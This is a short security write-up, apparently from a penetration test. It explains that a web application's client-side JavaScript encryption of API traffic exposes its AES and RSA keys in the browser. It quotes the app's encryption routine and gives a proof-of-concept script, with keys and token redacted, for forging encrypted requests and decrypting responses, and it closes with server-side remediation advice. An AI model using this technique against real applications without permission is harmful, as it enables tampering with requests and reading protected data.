# Javascript Side Insecure Encryption

Hi,

In an application I tested, I realized that the requests sent were sent in encrypted form and the response was sent to the user in the same way.
In this way, the attacker would not be able to detect vulnerabilities on parameters.


![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/enctraffic/1.png)

While investigating this situation, I started to research this algorithm on the javascript side.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/enctraffic/2.png)

As you can see, while performing the debug operation on the code, the content of the request sent is seen and encrypted with certain algorithms. In addition, since the request sent for each api function will be seen on the javascript side, the attacker can copy it and send it again by changing the JSON data.
```javascript

  t.prototype.encryptRequestData = function(t) {
                var n = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
                  , e = ha.AES.encrypt(JSON.stringify(t), n).toString()
                  , l = new pa.JSEncrypt;
                return l.setPublicKey(this.CONSTANTS.authorization.client_public_key),
                {
                    encData: e,
                    encVal: l.encrypt(n.toString())
                }
            }

```

In line *75666*, a random secret key is created *(Math.random)* first to encrypt the request with public_key. Then, with the *"CryptoJS"* library, the encryption process is carried out with AES.

The request consists of 2 parts;

*1- encData = Original request content*
*2- encVal = The secret key used to decrypt the request*


![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/enctraffic/3.png)

As you can see, when you make a request with these 2 parameters, the response is resolved with a private key using the *"JSEncrypt"* library. This weakness, of course, causes the encryption process to be disclosed in the public and private key because it is done on the javascript side.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/enctraffic/4.png)

I wrote a code to edit my request and send it.

![enter image description here](https://raw.githubusercontent.com/azizaltuntas/azizaltuntas.github.io/master/_posts/enctraffic/5.png)

I can see the answer in clear text by encrypting the original request and then putting the returned answer into the decrypt process. In this way, the attacker can perform vulnerability investigations again.



**My POC Code;**

```javascript
//Keys

var public_key = "-----BEGIN PUBLIC KEY-----SNIP-----END PUBLIC KEY-----"
var private_key = "-----BEGIN PRIVATE KEY-----SNIP----END PRIVATE KEY-----"

//Encrypt Request Function

var enckey = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15)
var myString   = { category_id_list: ["9"], access_token: "2_5POBmbyrGom3GqMpRY--SNIP--AAMlYwkZjTe1GY28m_LwAjEci"};
var enc = ""
var encrypted = CryptoJS.AES.encrypt(JSON.stringify(myString), enckey).toString();
var decrypted = CryptoJS.AES.decrypt(encrypted, enckey);
l = new JSEncrypt;
l.setPublicKey(public_key)

console.log("Encrypt Key:", enckey)
console.log("Original String:", JSON.stringify(myString));
console.log("encData:", encrypted);
console.log("encVal:", l.encrypt(enckey.toString()))
console.log("Decrypt String:", decrypted.toString(CryptoJS.enc.Utf8));

//Decrypt Response Function

var encResVal = ""
var encResData = ""
var e = new JSEncrypt;
e.setPrivateKey(private_key);
var l = e.decrypt(encResVal, "utf8")
var i = CryptoJS.AES.decrypt(encResData, l).toString(CryptoJS.enc.Utf8);
console.log("encResData", i)

```



This encryption process needs to be done on the PHP side. In this way, the attacker cannot reach the public and private key and algorithm.
